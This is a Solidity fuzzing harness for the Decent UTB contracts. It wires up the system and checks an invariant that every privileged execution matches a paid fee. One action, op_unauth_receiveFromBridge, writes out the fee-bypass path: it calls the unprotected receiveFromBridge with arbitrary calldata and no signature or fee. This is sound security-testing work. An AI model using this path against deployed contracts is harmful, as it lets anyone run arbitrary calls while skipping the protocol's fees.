// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Medusa/Echidna property harness for the Decent UTB fee-bypass mechanism.
// Cheatcode-free: the harness IS the deployer/owner, so it wires the system with
// plain calls. The fuzzer calls the zero-arg `op_*` actions in random order and
// checks the property; it must DISCOVER that op_unauth_receiveFromBridge() drives
// the state to break the invariant. The path is found by fuzzing, not written.

import {ERC20} from "solmate/tokens/ERC20.sol";
import {UTB} from "../../src/UTB.sol";
import {UTBExecutor} from "../../src/UTBExecutor.sol";
import {UTBFeeCollector} from "../../src/UTBFeeCollector.sol";
import {ISwapper} from "../../src/interfaces/ISwapper.sol";
import {SwapParams} from "../../src/swappers/SwapParams.sol";
import {SwapInstructions} from "../../src/CommonTypes.sol";

contract FuzzToken is ERC20 {
    constructor() ERC20("Fuzz", "FZZ", 18) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract FuzzSwapper is ISwapper {
    address public tokenOut;
    constructor(address t) { tokenOut = t; }
    function getId() external pure returns (uint8) { return 1; }
    function swap(bytes memory) external view returns (address, uint256) { return (tokenOut, 0); }
    function updateSwapParams(SwapParams memory, bytes memory p) external pure returns (bytes memory) { return p; }
}

contract FuzzTarget {
    uint256 public pwnedCount;
    function pwn() external { pwnedCount++; }
}

contract DecentFuzzHarness {
    UTB internal utb;
    UTBExecutor internal executor;
    UTBFeeCollector internal feeCollector;
    FuzzSwapper internal swapper;
    FuzzToken internal feeToken;
    FuzzTarget internal target;
    uint256 internal constant FEE = 1e18;

    constructor() {
        feeToken = new FuzzToken();
        target = new FuzzTarget();
        utb = new UTB();
        executor = new UTBExecutor();
        feeCollector = new UTBFeeCollector();
        swapper = new FuzzSwapper(address(feeToken));

        executor.transferOwnership(address(utb));
        feeCollector.setUtb(address(utb));
        feeCollector.setSigner(address(0xBEEF));
        utb.setExecutor(address(executor));
        utb.setFeeCollector(payable(address(feeCollector)));
        utb.registerSwapper(address(swapper));
    }

    function _postBridge() internal view returns (SwapInstructions memory) {
        SwapParams memory sp = SwapParams({
            amountIn: 0, amountOut: 0, tokenIn: address(feeToken),
            tokenOut: address(feeToken), direction: 0, path: ""});
        return SwapInstructions({swapperId: 1, swapPayload: abi.encode(sp)});
    }

    // --- fuzzer actions (zero-arg; the fuzzer composes sequences of these) ---

    /// The candidate exploit path. The fuzzer must find that calling this breaks
    /// the property. No signature, no fee — receiveFromBridge has no modifier.
    function op_unauth_receiveFromBridge() external {
        utb.receiveFromBridge(
            _postBridge(),
            address(target),
            address(target),
            abi.encodeWithSignature("pwn()"),
            payable(address(this)));
    }

    // --- property: privileged executes must equal authorized fee payments ---

    function property_executes_equal_fees() external view returns (bool) {
        uint256 executions = target.pwnedCount();
        uint256 feesPaid = feeToken.balanceOf(address(feeCollector)) / FEE;
        return executions == feesPaid;
    }
}
